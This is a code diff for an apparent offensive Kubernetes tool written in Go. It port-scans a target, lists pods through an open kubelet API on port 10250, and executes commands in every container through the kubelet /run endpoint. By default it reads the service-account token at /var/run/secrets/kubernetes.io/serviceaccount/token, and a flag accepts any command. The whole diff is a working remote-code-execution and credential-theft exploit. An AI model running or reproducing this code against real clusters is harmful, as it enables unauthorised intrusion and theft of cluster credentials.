@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"net"
 	"net/http"
 	"strconv"
 	"strings"
@@ -16,6 +17,8 @@ import (
 var scanNode = false
 var target string
 var anonRce = false
+var rceCommand = "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+var openPort []int
 
 type RunningPods struct {
 	Kind       string `json:"kind"`
@@ -42,6 +45,24 @@ type RunningPods struct {
 	} `json:"items"`
 }
 
+func nodeport_scan(target string, port int) {
+	servAddr := target + ":" + strconv.Itoa(port)
+	_, err := net.Dial("tcp", servAddr)
+	if !strings.Contains(err.Error(), "connection refused") {
+		openPort = append(openPort, port)
+	}
+
+}
+
+func send_http_request(target string, port int, endpoint string) {
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	resp, err := http.Get(target + ":" + strconv.Itoa(port) + endpoint)
+	if err == nil {
+		openPort = append(openPort, port)
+		defer resp.Body.Close()
+	}
+}
+
 func parse_pod(target string) {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	resp, err := http.Get("https://" + target + ":10250/runningpods/")
@@ -61,10 +82,7 @@ func parse_pod(target string) {
 	if err != nil {
 		log.Fatalln(err)
 	}
-
-	if anonRce {
-		anon_rce(input)
-	}
+	anon_rce(input)
 
 }
 
@@ -76,9 +94,10 @@ func anon_rce(runpod *RunningPods) {
 			namespace := runpod.Items[i].Metadata.Namespace
 			pod := runpod.Items[i].Metadata.Name
 			container := runpod.Items[i].Spec.Containers[j].Name
-			url := "https://localhost:10250/run/" + namespace + "/" + pod + "/" + container
+			url := "https://" + target + ":10250/run/" + namespace + "/" + pod + "/" + container
 			method := "POST"
-			payload := strings.NewReader("cmd=ls")
+
+			payload := strings.NewReader("cmd=" + rceCommand)
 
 			client := &http.Client{}
 			req, err := http.NewRequest(method, url, payload)
@@ -114,27 +133,16 @@ func anon_rce(runpod *RunningPods) {
 
 }
 
-func send_http_request(target string, port int, endpoint string) {
-	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-	resp, err := http.Get(target + ":" + strconv.Itoa(port) + endpoint)
-	if err != nil {
-		fmt.Printf("Port %d not open on %s \n", port, target)
-	} else {
-		fmt.Printf("Port: %d, status: %d \n", port, resp.StatusCode)
-		defer resp.Body.Close()
-	}
-}
-
 func check_ports(target string) {
-	target = "http://" + target
-	endpoint := "/"
 	knownPort := []int{443, 2379, 6666, 4194, 6443, 8443, 8080, 10250, 10255, 10256, 9099, 6782, 6783, 6784, 44134}
 
 	if scanNode {
-		for i := 30000; i <= 32767; i++ {
-			knownPort = append(knownPort, i)
+		for port := 30000; port <= 32767; port++ {
+			nodeport_scan(target, port)
 		}
 	}
+	target = "http://" + target
+	endpoint := "/"
 	for _, port := range knownPort {
 		if port == 10250 {
 			target := strings.Replace(target, "http", "https", 1)
@@ -146,6 +154,11 @@ func check_ports(target string) {
 		}
 
 	}
+
+	fmt.Println("Open Ports :")
+	for _, port := range openPort {
+		fmt.Println(strconv.Itoa(port))
+	}
 }
 
 func main() {
@@ -153,8 +166,12 @@ func main() {
 	getopt.FlagLong(&target, "target", 't', "target (IP or domain)").Mandatory()
 	getopt.FlagLong(&scanNode, "node-scan", 0, "Enable/disable node port scan").SetOptional()
 	getopt.FlagLong(&anonRce, "anon-rce", 0, "Directly try to RCE if kubelet API is open").SetOptional()
+	getopt.Flag(&rceCommand, 'x', "Command to execute when using RCE")
 	getopt.Parse()
 
 	check_ports(target)
-	parse_pod(target)
+
+	if anonRce {
+		parse_pod(target)
+	}
 }
